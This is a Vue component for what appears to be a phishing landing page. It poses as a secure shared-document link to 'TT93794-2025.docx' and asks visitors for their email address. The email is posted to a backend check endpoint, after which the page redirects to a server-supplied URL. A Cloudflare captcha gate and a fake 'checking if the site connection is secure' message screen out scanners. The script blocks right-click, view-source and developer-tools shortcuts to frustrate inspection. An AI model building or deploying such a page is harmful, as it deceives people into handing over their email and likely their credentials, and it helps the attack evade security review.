
<template>
  <div v-if="!captchaToken" class="gate-container">
    <main>
      <div class="instructions captcha-adjusted">
        <p>Please stand by while we are checking if the site connection is secure.</p>
        <div class="cf-turnstile" data-sitekey="0x4AAAAAABgei6QZruCN7n08"></div>
      </div>
    </main>
  </div>

  <div v-else class="container">
    <div class="overlay" id="overlay">
      <div class="input-section" id="inputSection">
        <form @submit.prevent="submitForm">
          <img
            src="https://i.postimg.cc/s2TBQ89k/ldimg1.png"
            width="100"
            height="35"
          >
          <p>You've received a secure link to:</p>
          <p style="font-size: 16px; color: #000000;">TT93794-2025.docx</p>
          <p style="font-size: 16px;">To proceed, enter the email that this <br>item was shared to</p>

          <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
          <input id="honeypot" v-model="honeypot" type="text" tabindex="-1" autocomplete="off" aria-hidden="true" class="visually-hidden" />

          <label for="email" class="visually-hidden">Email address</label>
          <input id="email" v-model="email" type="email" placeholder="Enter email" required :disabled="loading" />

          <p v-if="error" class="error" role="alert" aria-live="polite">{{ error }}</p>

          <button type="submit" :disabled="loading">
            {{ loading ? 'Submitting…' : 'Next' }}
          </button>

          <p>
            <br>
            © 2025 Privacy Policy
            <br><br><br>
          </p>
        </form>
      </div>
    </div>
  </div>
</template>


<script setup>
import { ref, onMounted, nextTick } from 'vue'

const email = ref('')
const honeypot = ref('')
const error = ref('')
const loading = ref(false)
const captchaToken = ref(null)
let turnstileRendered = false

onMounted(async () => {
  await nextTick()
  document.addEventListener('contextmenu', e => e.preventDefault())
  document.addEventListener('keydown', e => {
    if (
      e.key === 'F12' ||
      (e.ctrlKey && ['u', 's', 'p'].includes(e.key.toLowerCase())) ||
      (e.ctrlKey && e.shiftKey && ['i', 'j', 'c'].includes(e.key.toLowerCase()))
    ) {
      e.preventDefault()
    }
  })

  if (window.turnstile && !turnstileRendered) {
    window.turnstile.render('.cf-turnstile', {
      sitekey: '0x4AAAAAABgei6QZruCN7n08',
      callback: token => {
        captchaToken.value = token
        setTimeout(() => {
          captchaToken.value = null
          turnstileRendered = false
          window.turnstile.render('.cf-turnstile', {
            sitekey: '0x4AAAAAABgei6QZruCN7n08',
            callback: t => captchaToken.value = t
          })
        }, 120000)
      }
    })
    turnstileRendered = true
  }
})

function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
}

async function submitForm() {
  if (loading.value) return
  error.value = ''

  if (!isValidEmail(email.value)) {
    error.value = 'Invalid email format'
    return
  }

  loading.value = true
  try {
    const res = await fetch(`${import.meta.env.VITE_API_BASE}/api/check-email`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: email.value,
        captchaToken: captchaToken.value,
        middleName: honeypot.value
      })
    })
    const data = await res.json()
    if (!res.ok || !data.valid) throw new Error(data.message || 'Verification failed')
    if (data.redirectUrl) {
      setTimeout(() => {
        window.location.href = data.redirectUrl
      }, 1500)
    }
  } catch (err) {
    error.value = err.message
    loading.value = false
  }
}
</script>


<style scoped>
body {
  font-family: Arial, sans-serif;
  text-align: center;
  margin: 0;
  padding: 0;
  background-color: #f7f9f9;
  height: 100%;
}

.container {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  min-height: 76vh;
}

.logo {
  width: 150px;
  margin-bottom: 20px;
  margin-top: 20px;
}

iframe {
  width: 100%;
  height: 90%;
  border: none;
  display: block;
  margin: 0 auto;
  overflow-x: hidden;
  object-fit: contain;
  object-position: center;
}

.blurred {
  filter: blur(10px);
}

.input-section {
  position: absolute;
  top: 40%;
  left: 50%;
  transform: translate(-50%, -50%);
  background-color: #fff;
  padding: 13px;
  border: 0.1px solid #dddd;
  text-align: center;
  width: 150%;
  max-width: 324px;
}

.input-section p {
  margin: 8px 0;
  color: black;
}

.input-section input {
  width: 89%;
  max-width: 500px;
  padding: 10px 5px;
  margin: 15px;
  display: block;
  border: 1px solid #ccc;
  font-size: 16px;
  box-sizing: border-box;
  color: black;
}

.input-section button {
  background-color: #1D7CDB;
  color: white;
  border: none;
  padding: 9px 115px;
  cursor: pointer;
  font-size: 16px;
}

.input-section button:hover {
  background-color: #1D7CDB;
}

.overlay {
  margin: 5;
  display: flex;
  justify-content: center;
  align-items: flex-start;
  height: 80vh;
  background-color: #f9f9f9;
  padding-top: 50px;
}
</style>
